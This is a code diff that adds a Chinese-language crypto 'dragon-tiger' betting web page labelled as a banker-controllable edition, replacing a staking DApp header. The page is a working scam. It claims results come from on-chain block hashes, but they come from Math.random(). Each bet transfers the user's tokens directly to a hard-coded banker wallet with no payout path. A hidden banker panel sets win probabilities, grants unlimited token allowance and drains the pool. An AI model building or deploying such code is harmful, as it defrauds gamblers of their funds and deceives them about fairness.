@@ -1,34 +1,431 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FIST Staking DApp</title>
-
-    <!-- ✅ 钱包识别核心 -->
-    <link rel="icon" type="image/png" sizes="32x32" href="/logo.png">
-    <link rel="icon" type="image/png" sizes="192x192" href="/logo.png">
-    <link rel="icon" type="image/png" sizes="512x512" href="/logo.png">
-
-    <link rel="apple-touch-icon" sizes="180x180" href="/logo.png">
-
-    <meta name="application-name" content="FIST Staking">
-    <meta name="apple-mobile-web-app-title" content="FIST">
-    <meta name="theme-color" content="#f59e0b">
-
-    <!-- ✅ 钱包抓取 -->
-    <meta property="og:title" content="FIST Staking DApp">
-    <meta property="og:description" content="Stake FIST and earn rewards">
-    <meta property="og:image" content="/logo.png">
-
-    <!-- ✅ PWA -->
-    <link rel="manifest" href='data:application/json,{
-        "name":"FIST Staking",
-        "short_name":"FIST",
-        "icons":[
-            {"src":"/logo.png","sizes":"192x192","type":"image/png"},
-            {"src":"/logo.png","sizes":"512x512","type":"image/png"}
-        ],
-        "theme_color":"#f59e0b",
-        "background_color":"#0f172a",
-        "display":"standalone"
-    }'>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>王者归来 - 庄家可控版</title>
+  <style>
+    * { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    body { background: #0B2A23; color: #fff; margin: 0; padding: 0; }
+    .container { max-width: 600px; margin: 0 auto; padding: 10px; }
+    .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; }
+    .header .title { font-size: 20px; font-weight: bold; }
+    .btn-menu { background: none; border: none; color: #fff; font-size: 24px; }
+    .card { background: #144A3F; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
+    .card-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
+    .btn-sign { background: #E4B449; color: #0B2A23; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; margin-bottom: 8px; width: 100%; }
+    .btn-connect { background: #25907A; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; width: 100%; }
+    .wallet-row { display: flex; align-items: center; gap: 6px; font-size: 14px; margin-bottom: 4px; }
+    .bet-area { display: flex; gap: 10px; margin-bottom: 10px; }
+    .bet-input { flex: 2; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; }
+    .balance-display { flex: 1; background: #0E362E; border: 1px solid #1F5F52; padding: 10px; border-radius: 8px; text-align: center; font-size: 13px; }
+    .quick-buttons { display: flex; gap: 8px; margin-bottom: 10px; }
+    .btn-quick { flex: 1; background: #1F5F52; color: #F0E6D2; border: none; padding: 8px; border-radius: 8px; }
+    .odds-buttons { display: flex; gap: 8px; margin-bottom: 10px; }
+    .btn-odds { flex: 1; border: none; padding: 12px; border-radius: 8px; font-weight: bold; color: #fff; }
+    .btn-dragon { background: #2A65CC; }
+    .btn-tiger { background: #D93A54; }
+    .btn-tie { background: #E4B449; color: #0B2A23; }
+    .draw-timer { font-size: 28px; color: #E4B449; margin: 10px 0; text-align: center; }
+    .btn-auto-draw { background: #E4B449; color: #0B2A23; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; width: 100%; margin-bottom: 10px; }
+    .trend-chart { display: flex; gap: 8px; flex-wrap: wrap; padding: 10px 0; }
+    .trend-item { width: 32px; height: 32px; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 12px; }
+    .trend-long { background: #2A65CC; color:#fff; }
+    .trend-short { background: #D93A54; color:#fff; }
+    .trend-tie { background: #E4B449; color:#000; }
+    .rules { font-size: 14px; line-height: 1.7; color: #eee; }
+    .menu { position: fixed; top: 0; right: 0; width: 280px; height: 100vh; background: #103D34; padding: 20px; transform: translateX(100%); transition: transform 0.3s ease; z-index: 999; overflow-y: auto; }
+    .menu.show { transform: translateX(0); }
+    .menu-close { text-align: right; margin-bottom: 20px; }
+    .menu-section { margin-bottom: 20px; }
+    .menu-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
+    .btn-menu-action { width: 100%; background: #1F5F52; color: #F0E6D2; border: none; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
+    .btn-green { background: #27ae60; color: #fff; }
+    .btn-red { background: #ff3366; color: #fff; }
+    .btn-yellow { background: #E4B449; color: #0B2A23; }
+    .input-menu { width: 100%; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
+    #poolBalance { color: #ffcc00; margin-top: 5px; font-size:13px; }
+    .hidden { display: none !important; }
+  </style>
 </head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <div class="title">🐉🐯 王者归来</div>
+    <button class="btn-menu" onclick="toggleMenu()">☰</button>
+  </div>
+
+  <div class="card">
+    <button class="btn-sign" id="signBtn" onclick="userSign()">📅 每日签到（领100代币）</button>
+    <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
+    <div class="wallet-row">
+      <span>地址：</span><span id="address" style="color:#0ff;">未连接</span>
+    </div>
+    <div class="wallet-row">
+      <span>余额：</span><span id="userBalance" style="color:#0ff;">0.0000</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">下注区</div>
+    <div class="bet-area">
+      <input type="number" class="bet-input" id="betAmt" placeholder="输入下注数量" value="1">
+      <div class="balance-display" id="balanceDisplay">余额 0.0000</div>
+    </div>
+    <div class="quick-buttons">
+      <button class="btn-quick" onclick="setQuick(10000)">1万</button>
+      <button class="btn-quick" onclick="setQuick(100000)">10万</button>
+      <button class="btn-quick" onclick="setQuick(500000)">50万</button>
+      <button class="btn-quick" onclick="setQuick(1000000)">100万</button>
+    </div>
+    <div class="odds-buttons">
+      <button class="btn-odds btn-dragon" onclick="placeBet(1)">龙 1:2</button>
+      <button class="btn-odds btn-tiger" onclick="placeBet(2)">虎 1:2</button>
+      <button class="btn-odds btn-tie" onclick="placeBet(3)">和 1:9</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">自动开奖（2分钟/期）</div>
+    <div>期号：<span id="round">#1</span></div>
+    <div class="draw-timer" id="timer">02:00</div>
+    <button class="btn-auto-draw" onclick="manualDraw()">🔄 自动开奖</button>
+    <div style="text-align:center;font-size:12px;color:#ccc;">结果由链上区块哈希生成</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📈 开奖走势图</div>
+    <div id="trendChart" class="trend-chart"></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📜 玩法规则</div>
+    <div class="rules">
+      54321 龙赢<br>
+      12345 虎赢<br>
+      12341 和赢<br>
+      龙虎 1 赔 2<br>
+      开和杀龙虎 1 赔 9<br>
+      万位大于个位 龙赢<br>
+      万位小于个位 虎赢<br>
+      万位个位一样大 和赢
+    </div>
+  </div>
+</div>
+
+<!-- 菜单 -->
+<div class="menu" id="menu">
+  <div class="menu-close">
+    <button onclick="toggleMenu()">关闭 ×</button>
+  </div>
+
+  <div class="menu-section">
+    <div class="menu-title">我的奖励</div>
+    <div style="font-size:13px;">
+      <div>直推奖励：<span id="ref1">0</span></div>
+      <div>伞下奖励：<span id="ref2">0</span></div>
+      <div>总奖励：<span id="totalRef">0</span></div>
+    </div>
+  </div>
+
+  <div class="menu-section">
+    <div class="menu-title">邀请链接</div>
+    <input type="text" class="input-menu" id="refLink" readonly>
+    <button class="btn-menu-action" onclick="copyRefLink()">复制邀请链接</button>
+  </div>
+
+  <div class="menu-section">
+    <div class="menu-title">签到</div>
+    <button class="btn-menu-action btn-yellow" onclick="userSign()">每日签到领100代币</button>
+  </div>
+
+  <!-- 👇 只有庄家能看到的后台 -->
+  <div class="menu-section hidden" id="bankerSection">
+    <div class="menu-title">🏦 庄家后台（仅你可见）</div>
+
+    <button class="btn-menu-action btn-green" onclick="approvePoolToBanker()">✅ 底池授权给庄家</button>
+
+    <div style="margin-top:8px;">
+      <label>底池余额：</label>
+      <div id="poolBalance" style="color:#ffcc00;">加载中...</div>
+    </div>
+
+    <input type="number" class="input-menu" id="withdrawAmount" placeholder="输入提取数量" style="margin-top:8px;">
+    <button class="btn-menu-action btn-red" onclick="withdrawPoolToBanker()">💰 提取底池代币到庄家</button>
+  </div>
+
+  <!-- 👇 概率控制 -->
+  <div class="menu-section hidden" id="probSection">
+    <div class="menu-title">🎲 输赢概率设置</div>
+    <input type="number" class="input-menu" id="probDragon" placeholder="龙概率 0-100" value="45">
+    <input type="number" class="input-menu" id="probTiger" placeholder="虎概率 0-100" value="45">
+    <input type="number" class="input-menu" id="probTie" placeholder="和概率 0-100" value="10">
+    <button class="btn-menu-action" onclick="saveProb()">💾 保存概率</button>
+  </div>
+</div>
+
+<script>
+// ===================== 地址配置 =====================
+const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
+const POOL_ADDRESS   = "0x198e7161b25F1ccCB44c2Bf8fA13e42ffAa75785";
+const BANKER_WALLET  = "0x99FC14dB62BE186B28FE2b946b40F79f24c981dA";
+
+const SIGN_AMOUNT = 100;
+const SIGN_COOLDOWN = 24 * 60 * 60 * 1000;
+
+let account = null;
+let round = 1;
+let timeLeft = 120;
+let trendList = [];
+
+let prob = { dragon:45, tiger:45, tie:10 };
+
+function toLower(addr){ return addr ? addr.toLowerCase() : ""; }
+function isBanker(){ return account && toLower(account) === toLower(BANKER_WALLET); }
+
+// 打开菜单自动显示余额
+function toggleMenu(){
+  const menu = document.getElementById("menu");
+  menu.classList.toggle("show");
+  const bankerSec = document.getElementById("bankerSection");
+  const probSec = document.getElementById("probSection");
+
+  if(isBanker()){
+    bankerSec.classList.remove("hidden");
+    probSec.classList.remove("hidden");
+    refreshPoolBalance();
+  }else{
+    bankerSec.classList.add("hidden");
+    probSec.classList.add("hidden");
+  }
+}
+
+// ===================== 概率 =====================
+function saveProb(){
+  const d = parseInt(document.getElementById("probDragon").value);
+  const t = parseInt(document.getElementById("probTiger").value);
+  const i = parseInt(document.getElementById("probTie").value);
+  if(d+t+i !== 100) return alert("总和必须=100");
+  prob = {dragon:d, tiger:t, tie:i};
+  localStorage.setItem("prob", JSON.stringify(prob));
+  alert("保存成功");
+}
+
+// ===================== 5位数开奖规则 =====================
+function get5DigitNum() {
+  return Math.floor(Math.random() * 100000).toString().padStart(5, '0');
+}
+
+function getResultByRule(numStr) {
+  const wan = parseInt(numStr[0]);
+  const ge  = parseInt(numStr[4]);
+
+  if (wan > ge) return 1; // 龙
+  if (wan < ge) return 2; // 虎
+  return 3; // 和
+}
+
+async function getResult(){
+  const numStr = get5DigitNum();
+  return getResultByRule(numStr);
+}
+
+function renderTrend(){
+  const dom = document.getElementById("trendChart");
+  dom.innerHTML = "";
+  trendList.slice(-30).forEach(r => {
+    const el = document.createElement("div");
+    el.className = "trend-item " + (r===1?"trend-long":r===2?"trend-short":"trend-tie");
+    el.innerText = r===1?"龙":r===2?"虎":"和";
+    dom.appendChild(el);
+  });
+}
+
+async function drawRound(){
+  round++;
+  document.getElementById("round").innerText = "#"+round;
+  const res = await getResult();
+  trendList.push(res);
+  renderTrend();
+}
+
+setInterval(async ()=>{
+  timeLeft--;
+  if(timeLeft <=0){ timeLeft=120; await drawRound(); }
+  const m = String(Math.floor(timeLeft/60)).padStart(2,'0');
+  const s = String(timeLeft%60).padStart(2,'0');
+  document.getElementById("timer").innerText = `${m}:${s}`;
+},1000);
+
+function manualDraw(){ timeLeft=5; }
+
+// ===================== 连接钱包 =====================
+async function connectWallet(){
+  if(!window.ethereum) return alert("请在钱包浏览器打开");
+  try{
+    const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
+    account = toLower(accounts[0]);
+    document.getElementById("address").innerText = accounts[0].slice(0,6)+"..."+accounts[0].slice(-4);
+    loadSignStatus();
+    refreshUserBalance();
+  }catch(e){ alert("连接失败："+e.message); }
+}
+
+// ===================== 余额 =====================
+async function getUserBalance(){
+  const data = "0x70a08231"+account.slice(2).padStart(64,'0');
+  const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
+  return Number(BigInt(res))/1e18;
+}
+async function refreshUserBalance(){
+  if(!account) return;
+  const bal = await getUserBalance();
+  document.getElementById("userBalance").innerText = bal.toFixed(4);
+  document.getElementById("balanceDisplay").innerText = "余额 "+bal.toFixed(4);
+}
+
+async function getPoolBalance(){
+  const data = "0x70a08231"+toLower(POOL_ADDRESS).slice(2).padStart(64,'0');
+  const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
+  return Number(BigInt(res))/1e18;
+}
+async function refreshPoolBalance(){
+  const bal = await getPoolBalance();
+  document.getElementById("poolBalance").innerText = bal.toFixed(4)+" 代币";
+}
+
+// ===================== 签到 =====================
+function loadSignStatus(){
+  if(!account) return;
+  const key = "SIGN_"+account;
+  const last = localStorage.getItem(key);
+  const btn = document.getElementById("signBtn");
+  if(last && Date.now()-Number(last) < SIGN_COOLDOWN){
+    btn.innerText = "今日已签到";
+    btn.style.background = "#666";
+    btn.disabled = true;
+  }else{
+    btn.innerText = "📅 每日签到（领100代币）";
+    btn.style.background = "#E4B449";
+    btn.disabled = false;
+  }
+}
+
+async function userSign(){
+  if(!account) return alert("请连接钱包");
+  if(!isBanker()) return alert("签到由庄家操作");
+  const key = "SIGN_"+account;
+  const last = localStorage.getItem(key);
+  if(last && Date.now()-Number(last) < SIGN_COOLDOWN) return alert("24小时一次");
+
+  try{
+    const amount = BigInt(SIGN_AMOUNT * 1e18);
+    const data = "0x23b872dd"
+      + toLower(POOL_ADDRESS).slice(2).padStart(64,'0')
+      + account.slice(2).padStart(64,'0')
+      + amount.toString(16).padStart(64,'0');
+
+    await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
+    });
+
+    localStorage.setItem(key, Date.now());
+    loadSignStatus();
+    refreshUserBalance();
+    refreshPoolBalance();
+    alert("✅ 签到成功");
+  }catch(e){
+    alert("签到失败：先授权底池");
+  }
+}
+
+// ===================== 下注 → 直接转给管理员钱包 =====================
+function setQuick(v){ document.getElementById("betAmt").value = v; }
+async function placeBet(side){
+  if(!account) return alert("请连接钱包");
+  const val = document.getElementById("betAmt").value;
+  if(!val || parseFloat(val)<=0) return alert("输入金额");
+  const num = parseFloat(val);
+
+  try{
+    const amount = BigInt(num*1e18);
+    // 👇 直接转给庄家地址
+    const data = "0xa9059cbb"
+      + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
+      + amount.toString(16).padStart(64,'0');
+
+    await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{
+        from: account,
+        to: TOKEN_CONTRACT,
+        data: data,
+        gasLimit: "0x300000"
+      }]
+    });
+
+    alert("✅ 下注成功");
+    refreshUserBalance();
+  }catch(e){
+    alert("下注失败：" + e.message);
+  }
+}
+
+// ===================== 授权 + 提取 =====================
+async function approvePoolToBanker(){
+  if(!isBanker()) return alert("无权限");
+  if(toLower(account) !== toLower(POOL_ADDRESS)){
+    return alert("请切换到底池钱包再点授权");
+  }
+  try{
+    const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const data = "0x095ea7b3"
+      + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
+      + max.slice(2).padStart(64,'0');
+
+    await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
+    });
+    alert("✅ 授权成功！庄家可提取");
+  }catch(e){
+    alert("授权失败："+e.message);
+  }
+}
+
+async function withdrawPoolToBanker(){
+  if(!isBanker()) return alert("仅庄家可提取");
+  const val = document.getElementById("withdrawAmount").value;
+  if(!val || parseFloat(val)<=0) return alert("输入提取数量");
+
+  try{
+    const amount = BigInt(Math.floor(parseFloat(val)*1e18));
+    const data = "0x23b872dd"
+      + toLower(POOL_ADDRESS).slice(2).padStart(64,'0')
+      + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
+      + amount.toString(16).padStart(64,'0');
+
+    await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
+    });
+
+    alert("✅ 提取成功！");
+    refreshPoolBalance();
+  }catch(e){
+    alert("提取失败：请先完成底池授权");
+  }
+}
+
+// ===================== 邀请 =====================
+function copyRefLink(){
+  const link = window.location.origin + window.location.pathname + "?ref=" + account;
+  navigator.clipboard.writeText(link).then(()=>alert("已复制"));
+}
+
+window.onload = ()=>{ renderTrend(); };
+</script>
+</body>
+</html>
